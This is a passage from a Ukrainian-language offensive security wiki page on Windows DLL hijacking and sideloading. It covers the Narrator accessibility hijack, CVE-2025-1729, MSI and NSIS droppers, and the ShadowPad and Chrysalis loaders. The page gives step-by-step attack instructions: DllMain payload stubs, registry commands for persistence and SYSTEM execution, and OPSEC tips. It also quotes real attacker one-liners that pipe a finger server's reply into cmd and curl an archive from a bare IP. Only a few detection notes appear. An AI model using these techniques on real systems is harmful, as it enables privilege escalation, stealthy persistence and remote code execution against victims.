- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантажити вказаний вище файл.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Тиша OPSEC
- Наївний hijack озвучуватиме текст і підсвічуватиме елементи UI. Щоб діяти непомітно, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його за допомогою `SuspendThread`; продовжуйте роботу у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Запуск і закріплення через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеними вище налаштуваннями запуск Narrator завантажує розміщену DLL. На захищеному робочому столі (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.

Виконання SYSTEM через RDP (lateral movement)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP і на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.
- Виконання припиняється після закриття сеансу RDP — виконайте inject/migrate без зволікань.

Власний Accessibility (BYOA)
- Можна клонувати запис реєстру вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він указував на довільний бінарний файл/DLL, імпортувати його, а потім установити `configuration` у назву цього AT. Це дає змогу запускати довільний код через фреймворк Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Приклад: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

У цьому прикладі показано **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що відстежується під номером **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Відомості про вразливість

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Дозволи каталогу**: каталог доступний для запису користувачу `CREATOR OWNER`, що дає змогу локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: програма спершу намагається завантажити `hostfxr.dll` зі своєї робочої теки та, якщо файл відсутній, записує "NAME NOT FOUND". Це вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойта

Зловмисник може розмістити шкідливу DLL-заглушку `hostfxr.dll` у тому самому каталозі й скористатися відсутністю DLL, щоб виконати код у контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Сценарій атаки

1. Як звичайний користувач, розмістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під обліковим записом поточного користувача.
3. Якщо під час виконання завдання ввійшов адміністратор, шкідлива DLL запускається в сеансі адміністратора з середнім рівнем цілісності.
4. Поєднайте стандартні методи обходу UAC, щоб підвищити рівень доступу від середнього рівня цілісності до привілеїв SYSTEM.

## Приклад: MSI-дроппер із CustomAction + DLL side-loading через підписаний хост (wsc_proxy.exe)

Зловмисники часто поєднують дроппери на основі MSI з DLL side-loading, щоб запускати корисне навантаження в довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час встановлення через GUI непомітно виконується CustomAction (наприклад, LaunchApplication або дія VBScript), яка відновлює наступний етап із вбудованих ресурсів.
- Дроппер записує в один каталог легітимний підписаний EXE і шкідливу DLL (приклад пари: підписаний Avast файл wsc_proxy.exe + контрольований зловмисником файл wsc.dll).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спочатку завантажує wsc.dll із робочого каталогу, виконуючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (на що звернути увагу)
- Таблиця CustomAction:
  - Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені корисні навантаження у CAB-файлі MSI:
  - Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або скористайтеся lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий процес:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Практичний sideloading за допомогою wsc_proxy.exe
- Помістіть ці два файли в одну папку:
  - wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за назвою з власної директорії.
  - wsc.dll: DLL атакувальника. Якщо певні експорти не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте потрібні експорти до справжньої бібліотеки, запустивши payload у DllMain.
- Створіть мінімальний DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Для вимог до експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб створити forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на розпізнавання імен DLL хостовим бінарним файлом. Якщо хост використовує абсолютні шляхи або прапорці безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет завантаження, тому їх потрібно враховувати під час вибору хостового бінарного файла та набору експортів.

## Підписані тріади + зашифровані payload-и (приклад ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **тріади з трьох файлів**, щоб замаскуватися під легітимне програмне забезпечення й водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний хостовий EXE** – зловмисники використовують продукти таких постачальників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Вони перейменовують виконуваний файл так, щоб він нагадував бінарний файл Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Шкідлива loader DLL** – розміщується поруч із EXE під очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Зазвичай DLL є бінарним файлом MFC, обфускованим за допомогою фреймворку ScatterBrain; її єдине завдання — знайти зашифрований blob, розшифрувати його й відобразити ShadowPad у пам’ять за допомогою reflective loading.
3. **Зашифрований payload blob** – часто зберігається в тому самому каталозі як `<name>.tmp`. Після відображення розшифрованого payload у пам’ять loader видаляє TMP-файл, щоб знищити криміналістичні докази.

Нотатки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням оригінального `OriginalFileName` у PE-заголовку дає змогу видати його за бінарний файл Windows, зберігши підпис постачальника. Тож наслідуйте звичку Ink Dragon розміщувати бінарні файли, схожі на `conhost.exe`, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, для більшості засобів контролю allowlisting достатньо, щоб ваша шкідлива DLL була поруч із ним. Зосередьтеся на налаштуванні loader DLL; підписаний батьківський файл зазвичай можна запускати без змін.
* Дешифратор ShadowPad очікує, що TMP blob буде поруч із loader і матиме дозвіл на запис, щоб після відображення в пам’ять обнулити файл. Залиште каталог доступним для запису, доки payload не завантажиться; після цього TMP-файл можна безпечно видалити для OPSEC.

### LOLBAS stager + ланцюжок sideloading архіву зі staging (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх до `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи операторам змогу змінювати сервер другого етапу.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть цільовий файл для sideload разом із DLL у випадковій теці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує перебіг завантаження та переходить за перенаправленнями; `tar -xf` використовує вбудовану у Windows утиліту tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб телеметрія показувала процес, створений CIM, під час завантаження DLL, що лежить поруч:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які надають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, коли `/p`, `/m` і `/c` зустрічаються разом; таке поєднання рідко трапляється поза адміністративними скриптами.


## Практичний приклад: sideload через NSIS dropper + Bitdefender Submission Wizard (Chrysalis)

Під час недавнього вторгнення Lotus Blossom зловмисники використали довірений ланцюжок оновлення для доставки dropper, упакованого за допомогою NSIS, який розгортав sideload DLL і payloads, що повністю працювали в пам'яті.<sup>[[13]](#references)</sup>

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- Хостовий EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою потоку на основі LCG із власними параметрами (**0x19660D** / **0x3C6EF35F**) та ключовим матеріалом, похідним від попереднього хешу, перезаписує буфер відкритим shellcode, звільняє тимчасові дані й передає йому керування.
- Щоб уникнути IAT, завантажувач отримує адреси API, хешуючи назви export за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує avalanche-перетворення у стилі Murmur (**0x85EBCA6B**) і порівнює результат із хешами цілей із salt.

Основний shellcode (Chrysalis)
- Розшифровує головний модуль, схожий на PE, повторюючи операції додавання/XOR/віднімання з ключем `gQ2JR&9;` упродовж п'яти проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення розв'язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою перетворень із побітовим циклічним зсувом/XOR для кожного символу, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий резолвер, який проходить шляхом **PEB → InMemoryOrderModuleList**, аналізує кожну таблицю export блоками по 4 байти з перемішуванням у стилі Murmur і звертається до `GetProcAddress` лише тоді, коли хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація розміщена у скинутому файлі `BluetoothService` за **зміщенням 0x30808** (розмір **0x980**) і розшифровується за допомогою RC4 із ключем `qwhvb^435h&*7`, що дає змогу отримати URL C2 і User-Agent.
- Під час beacon-запитів формується профіль хоста з компонентами, розділеними крапками, на початок додається тег `4Q`, після чого дані шифруються RC4 із ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і обробляються перемикачем тегів (`4T` shell, `4V` виконання процесу, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` видалення, `4` перелік дисків/файлів і випадки передавання частинами).
- Режим виконання визначається аргументами CLI: без аргументів — встановлює persistence (service/ключ Run) із посиланням на `-i`; `-i` повторно запускає себе з `-k`; `-k` пропускає встановлення й запускає payload.

Зафіксовано альтернативний завантажувач
- Під час того самого вторгнення було розгорнуто Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а поруч із ним розміщено `libtcc.dll`. Наданий зловмисниками вихідний код C містив shellcode, який компілювався та запускався в пам'яті без запису PE на диск. Відтворіть це так:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання та завантажував shellcode другого етапу з жорстко заданого URL, забезпечуючи гнучкий loader, який маскується під запуск компілятора.

## DLL sideloading у підписаного хоста з проксіюванням експортів + присиплянням потоку хоста

У деяких ланцюжках DLL sideloading застосовують **заходи для стабільної роботи**, щоб легітимний хост залишався активним достатньо довго для коректного завантаження наступних етапів, а не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістіть довірений EXE поруч зі шкідливою DLL, використовуючи очікувану назву залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює кожен очікуваний експорт** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб імпорт і далі коректно розв’язувався, а процес хоста продовжував працювати.
- Після завантаження шкідлива DLL **патчить точку входу хоста**, щоб головний потік переходив у нескінченний цикл `Sleep`, а не завершувався чи виконував кодові шляхи, які припинили б процес.
- Новий потік виконує власне шкідливе завдання: розшифровує назву або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що хост працюватиме достатньо довго для наступних етапів.
- Присипляння головного потоку за допомогою `Sleep(INFINITE)` — простий спосіб залишити підписаний процес активним, поки loader виконує розшифрування, підготовку payload або мережеве ініціювання в робочому потоці.
- Пошук лише підозрілого `DllMain` не виявить цей шаблон, якщо цікава поведінка починається після патчення точки входу хоста та запуску додаткового потоку.

Мінімальний процес
1. Скопіюйте підписаний EXE хоста та визначте, яку DLL він завантажує з локальної директорії.
2. Створіть proxy DLL, яка експортує ті самі функції та перенаправляє їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створіть робочий потік.
4. У цьому потоці пропатчте точку входу хоста або стартову процедуру головного потоку так, щоб він зациклився на `Sleep`.
5. Розшифруйте назву/конфігурацію DLL наступного етапу та викличте `LoadLibrary` або виконайте manual-map payload.

Напрями для захисного аналізу
- Підписані процеси, які завантажують `version.dll` чи подібні поширені бібліотеки з власної директорії програми, а не з `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, особливо переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які відразу викликають `LoadLibrary` для другої DLL із розшифрованою назвою.
- Proxy DLL з повним набором експортів, розміщені поруч із виконуваними файлами постачальника у доступних для запису директоріях підготовки, як-от `ProgramData`, `%TEMP%` або розпаковані архіви.

## References

- [1] [Red Canary – Аналітичні висновки: січень 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове шкідливе ПЗ, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL Hijacks зустрічаються з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія кампаній з видаванням себе за інших, що розвиваються та поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Збіг інтересів: аналіз кластерів загроз, націлених на уряд Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Бекдор Chrysalis: докладний аналіз інструментарію Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — ланцюжок HTB Bruno: ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження шпигунських кампаній іранської APT Screening Serpens у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Швидко й люто: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
